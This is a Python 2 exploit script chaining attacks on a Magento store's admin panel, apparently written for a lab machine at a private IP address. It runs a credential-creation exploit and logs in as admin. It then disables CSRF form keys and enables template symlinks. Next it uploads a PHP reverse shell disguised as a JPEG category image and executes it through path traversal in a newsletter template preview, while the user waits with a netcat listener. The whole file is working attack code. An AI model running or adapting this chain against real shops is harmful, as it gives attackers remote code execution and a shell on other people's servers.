import sys
import subprocess
import re
import requests
import uuid
import string
from bs4 import BeautifulSoup


url = 'http://10.10.10.140/index.php'

# If the previous try-statement succeeded, the admin credentials are available.
# Before we can log in tho, we have to isolate the CRSF token from the html.

system_config_form_key = None
category_form_key = None
newsletter_form_key = None

newsletter_uuid = None
reverse_shell_uuid = None

def adminCredentialsExploit():
    try:
        # Execute the first exploit to gain admin access
        subprocess.check_output([sys.executable, "37977.py"])
        pass
    except subprocess.CalledProcessError, e:
        print "First exploit failed!"
        print e
        sys.exit(1)

def getLoginCsrfToken():
    page = requests.get(url + '/admin')
    soup = BeautifulSoup(page.content, 'html.parser')
    csrfToken = soup.find_all('input', attrs={"name": "form_key"})[0]['value']
    print csrfToken
    return csrfToken

"""Returns soup of the dashboard page after login"""
def getSessionAndLogin(session):
    payload = {
        'form_key': getLoginCsrfToken(),
        'login[password]': 'forme',
        'login[username]': 'forme'
    }
    # Login with the credentials
    login = session.post(url + '/admin', payload)
    return BeautifulSoup(login.content, 'html.parser')

"""Extract the system_config page"""
def getSystemConfigSoup(session, dashboardSoup):
    # Extract the right url
    for a in dashboardSoup.find_all("a", string="Configuration", href=True):
        configUrl = a['href']
    print configUrl
    # Get the settings page, to obtain the form key
    return BeautifulSoup(session.get(configUrl).content, 'html.parser')

"""Get the form key of the given soup. Assumes the page has a script tag with the form_key in it"""
def getFormKey(session, soup):
    # Find the script tag in the given soup. TODO: Error handling
    scripts = soup.find('script')

    # Extract the form key from the html, to manually make the request to disable the keys that are appended to urls.
    regex = r"var FORM_KEY = '(.*?)';"
    form_key = re.findall(regex, scripts.text)[0]

    print form_key
    return form_key

def disableUrlKeys(session, dashboardSoup):
    global system_config_form_key
    if not system_config_form_key:
        system_config_form_key = getFormKey(session, getSystemConfigSoup(session, dashboardSoup))
    systemConfigSoup = getSystemConfigSoup(session, dashboardSoup)
    
    for form in systemConfigSoup.find_all('form'):
        formActionUrl = form.get('action') # Extracting the submit url, which holds the key, to be able to submit the disable request.
    
    formRegex = r"/key/(.*?)/"
    try:
        urlKey = re.findall(formRegex, formActionUrl)[0]
    except IndexError:
        print "Url keys were already disabled. Skipping."
        return

    print urlKey

    # Data that is needed to disable the keys.
    # multipart_form_data = {
    #     'form_key': (None, system_config_form_key),
    #     'config_state[admin_emails]': (None, 1),
    #     'groups[emails][fields][forgot_email_template][value]': (None, 'admin_emails_forgot_email_template'),
    #     'groups[emails][fields][forgot_email_identity][value]': (None, 'general'),
    #     'groups[emails][fields][password_reset_link_expiration_period][value]': (None, 1),
    #     'config_state[admin_startup]': (None, 0),
    #     'groups[startup][fields][page][value]': (None, 'dashboard'),
    #     'config_state[admin_url]': (None, 0),
    #     'groups[url][fields][use_custom][value]': (None, 0),
    #     'groups[url][fields][use_custom_path][value]': (None, 0),
    #     'config_state[admin_security]': (None, 1),
    #     'groups[security][fields][use_case_sensitive_login][value]': (None, 0),
    #     'groups[security][fields][use_form_key][value]': (None, 0), ############
    #     'groups[security][fields][session_cookie_lifetime][value]': (None, None),
    #     'groups[security][fields][domain_policy_backend][value]': (None, 2),
    #     'groups[security][fields][domain_policy_frontend][value]': (None, 2),
    #     'config_state[admin_dashboard]': (None, 0),
    #     'groups[dashboard][fields][enable_charts][value]': (None, 1),
    #     'config_state[admin_captcha]': (None, 0),
    #     'groups[captcha][fields][enable][value]': (None, 0)
    # }
    
    multipart_form_data = {
        'form_key': (None, system_config_form_key),
        'groups[security][fields][use_form_key][value]': (None, 0) ############
    }

    response = session.post(url + '/admin/system_config/save/section/admin/key/' + urlKey + '/', files=multipart_form_data)

    # Test if response is valid
    if not response.status_code == 200:
        print "Key disabling went wrong... Aborting"
        sys.exit(1)


def enableSymlinks(session):
    global system_config_form_key
    print "Form key used:"
    print system_config_form_key

    form_data = {
        'form_key': (None, system_config_form_key),
        'groups[template][fields][allow_symlink][value]': (None, 1) ############
    }

    response = session.post(url + '/admin/system_config/save/section/dev/', files=form_data)

    if not response.status_code == 200:
        print "Enabling symlinks went wrong... Aborting"
        sys.exit(1)

def createCategoryAndUploadExploit(session):
    global category_form_key

    if not category_form_key:
        # Grabbing category page to extract the form key again
        category_soup = BeautifulSoup(session.get(url + '/admin/catalog_category').content, 'html.parser')
        category_form_key = getFormKey(session, category_soup)

    print 'Using category form key:'
    print category_form_key

    # form_data = {
    #     'form_key': (None, category_form_key),
    #     'general[name]': (None, str(uuid.uuid4())),
    #     'general[is_active]': (None, 1),
    #     'image': ('reverse_shell.php.jpg', open('reverse_shell.php.jpg', 'r'), 'image/jpeg'),
    #     'use_config[]': (None, 'available_sort_by'),
    #     'use_config[]': (None, 'default_sort_by'),
    #     # 'use_config[]': (None, 'filter_price_range'),
    #     'general[custom_use_parent_settings]': (None, 0),
    #     # 'general[custom_apply_to_products]': (None, 0)
    # }   

    # form_data = {
    #     'isIframe': (None, 1),
    #     'form_key': (None, category_form_key),
    #     'category_products': (None, None),
    #     'active_tab_id': (None, 'category_info_tabs_group_4'),
    #     'general[path]': (None, 1),
    #     'general[name]': (None, str(uuid.uuid4())),
    #     'general[is_active]': (None, 1),
    #     'thumbnail': (None, None),
    #     'general[description]': (None, None),
    #     'image': ('reverse_shell.php.jpg', open('reverse_shell.php.jpg', 'r'), 'image/jpeg'),
    #     'general[meta_title]': (None, None),
    #     'general[meta_keywords]': (None, None),
    #     'general[meta_description]': (None, None),
    #     'general[include_in_menu]': (None, 1),
    #     'general[display_mode]': (None, 'PRODUCTS'),
    #     'general[landing_page]': (None, None),
    #     'general[is_anchor]': (None, 0),
    #     # 'use_config[]': (None, 'available_sort_by'),
    #     'general[available_sort_by]': (None, None),
    #     'general[available_sort_by][]': (None, 'position'),
    #     'general[default_sort_by]': (None, 'position'),
    #     # 'use_config[]': (None, 'default_sort_by'),
    #     'use_config[]': (None, 'filter_price_range'),
    #     # 'general[custom_use_parent_settings]': (None, 0),
    #     'general[custom_apply_to_products]': (None, 0),
    #     'general[custom_design]': (None, None),
    #     'general[custom_design_from]': (None, None),
    #     'general[custom_design_to]': (None, None),
    #     'general[page_layout]': (None, None),
    #     'general[custom_layout_update]': (None, None),
    #     'page': (None, 1),
    #     'limit': (None, 20),
    #     'in_category': (None, None),
    #     'entity_id': (None, None),
    #     'name': (None, None),
    #     'sku': (None, None),
    #     'price[from]': (None, None),
    #     'price[to]': (None, None),
    #     'position[from]': (None, None),
    #     'position[to]': (None, None)
    # }

    global reverse_shell_uuid
    # reverse_shell_uuid = string.join(re.findall(r"[a-zA-Z0-9]+", str(uuid.uuid4())))
    reverse_shell_uuid = str(uuid.uuid4())

    print reverse_shell_uuid

    # Minimum required data to create a new category.
    # The name used is a random UUID4 string, to prevent possible naming collisions.
    form_data = {
        'form_key': (None, category_form_key),
        'general[name]': (None, str(uuid.uuid4())),
        'general[is_active]': (None, 1),
        'image': (reverse_shell_uuid + '.php.jpg', open('reverse_shell.php.jpg', 'r'), 'image/jpeg'),
        'general[include_in_menu]': (None, 1),
        'general[available_sort_by]': (None, None),
        'general[available_sort_by][]': (None, 'position'),
        'general[default_sort_by]': (None, 'position'),
        'use_config[]': (None, 'filter_price_range'),
    }

    response = session.post(url + '/admin/catalog_category/save/store/0/parent/1/?isAjax=true', files=form_data)

    if not response.status_code == 200:
        print "Submitting category went wrong... Aborting"
        sys.exit(1)

    regex = r"parent\.updateContent\(\"(.*?)\""
    try:
        response_url = re.findall(regex, response.content)[0]
    except IndexError:
        print "Couldn't find url in category response... Aborting"
        sys.exit(1)
    
    print response_url

    # Normal user behavior triggers another request, with an url that was returned from the previous request.
    # I added it here too, but I'm unsure of the purpose.
    form_data = {
        'form_key': category_form_key
    }

    response2 = session.post(response_url, data=form_data)

    if not response2.status_code == 200:
        print "Submitting category (again) went wrong... Aborting"
        sys.exit(1)


def createNewsletter(session):
    # http://10.10.10.140/index.php/admin/newsletter_template/save/
    global newsletter_form_key

    if not newsletter_form_key:
        newsletter_soup = BeautifulSoup(session.get(url + '/admin/newsletter_template/').content, 'html.parser')
        newsletter_form_key = getFormKey(session, newsletter_soup)

    global newsletter_uuid
    newsletter_uuid = str(uuid.uuid4())

    print newsletter_uuid

    form_data = {
        '_change_type_flag': None,
        '_save_as_flag': None,
        'code': newsletter_uuid,
        'form_key': newsletter_form_key,
        'sender_email': 'support@example.com',
        'sender_name': 'CustomerSupport',
        'styles': None,
        'subject': str(uuid.uuid4()),
        'text': "<p>{{block type='core/template' template='../../../../../../media/catalog/category/" + reverse_shell_uuid + ".php.jpg}}</p>"
    }

    response = session.post(url + '/admin/newsletter_template/save/', data=form_data)

    if not response.status_code == 200:
        print "Submitting newsletter went wrong... Aborting"
        sys.exit(1)

def openPreview(session):
    global newsletter_form_key

    newsletter_soup = BeautifulSoup(session.get(url + '/admin/newsletter_template/').content, 'html.parser')

    if not newsletter_form_key:
        newsletter_form_key = getFormKey(session, newsletter_soup)

    # Grep the id of the new newsletter from the html.
    # Unfortunately, the POST that created the new template doesn't return this id.
    # global newsletter_uuid
    # for td in newsletter_soup.find_all("td", string=re.compile(newsletter_uuid)):
    #     print td.find_previous_siblings("td")
    #     print re.findall(r"\d+", td.find_previous_siblings("td")[0].text)[0]

    # Find the element that holds the uuid that was assigned to the newsletter template
    uuid = newsletter_soup.find_all("td", string=re.compile(newsletter_uuid))[0]
    print uuid
    # Do really ugly regex stuff to extract the number from the previous td element
    newsletter_template_id = re.findall(r"\d+", uuid.find_previous_siblings("td")[0].text)[0]

    # Payload to open the newsletter template
    form_data = {
        'form_key': newsletter_form_key,
        'id': newsletter_template_id,
        'type': 2,
        'text': "<p>{{block type='core/template' template='../../../../../../media/catalog/category/" + reverse_shell_uuid + ".php.jpg}}</p>"
    }
    response = session.post(url + '/admin/newsletter_template/preview/', data=form_data)

    print response.content

    form_data = {
        'form_key': newsletter_form_key,
        'text': "<p>{{block type='core/template' template='../../../../../../media/catalog/category/" + reverse_shell_uuid + ".php.jpg}}</p>"
    }

    response2 = session.post(url + '/admin/newsletter_template/drop/', data=form_data)

    print response2.content

print "Initial exploit phase..."
adminCredentialsExploit()
print "Admin credentials exploited"

with requests.Session() as session:
    print "Logging in with exploited admin credentials"
    dashboardSoup = getSessionAndLogin(session)
    print "Disabling url keys"
    disableUrlKeys(session, dashboardSoup)

    # After disabling the url keys, requests can be made without having to go through the soup of the pages.
    # This means that now we can fake requests easier, and with less steps.

    print "Enabling symlinks"
    enableSymlinks(session)

    print "Uploading exploit"
    createCategoryAndUploadExploit(session)

    print "Creating newsletter"
    createNewsletter(session)

    print "Make sure you have your nc listening!"
    print "This script will hang after this, because the request will not finish until the shell is closed."
    raw_input("Press Enter to continue...")

    openPreview(session)